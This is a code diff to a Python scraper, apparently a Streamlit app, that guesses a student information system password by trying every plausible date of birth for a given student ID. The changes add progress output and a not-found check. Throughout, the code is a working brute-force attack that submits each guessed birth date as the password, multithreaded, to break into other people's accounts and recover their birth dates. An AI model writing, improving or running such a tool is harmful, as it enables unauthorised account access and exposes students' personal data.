@@ -80,14 +80,14 @@ class SisScraper(Scraper):
         yield stats
 
     @cached(get_cache())
-    @st.cache
+    # @st.cache
     def get_dob(self, usn) -> Union[str, None]:
         join_year = int("20" + usn[3:5])
         for year in [y := join_year - 18, y - 1, y + 1, y - 2]:
             if dob := self.brute_year(usn, year): return dob
 
     @cached(get_cache())
-    @st.cache
+    # @st.cache
     def brute_year(self, usn: str, year: int) -> Union[str, None]:
         workers = []
         dob = [None]
@@ -107,6 +107,9 @@ class SisScraper(Scraper):
             assert len(dob_thread) == 1, \
                 "dob_thread must have a single element, used for default value"
         for day in range(1, 32):
+            progress = f"Trying {day:02}-{month:02}-{year}"
+            print(progress + " " * 10, end="\r")
+
             if dob_list and len(dob_thread) > 1: return
             payload['username'] = usn.lower()
             payload['passwd'] = f"{year}-{month:02}-{day:02}"
@@ -228,13 +231,20 @@ if __name__ == '__main__':
             if check is False:
                 st.error("Invalid USN")
         if check or btn:
+            st.write("Trying all possible DOBs")
+
             with SisScraper() as SIS:
                 t = time.time()
+
                 dob = SIS.get_dob(f"{usn}")
                 t = time.time() - t
 
                 time_taken = f"Time taken: {t:.2f}sec"
                 st.write(time_taken)
+                if dob is None:
+                    st.error("Not Found")
+                    st.stop()
+
                 dobf = date.fromisoformat(dob)
                 formated_dob = dobf.strftime("%d %B %Y")
 
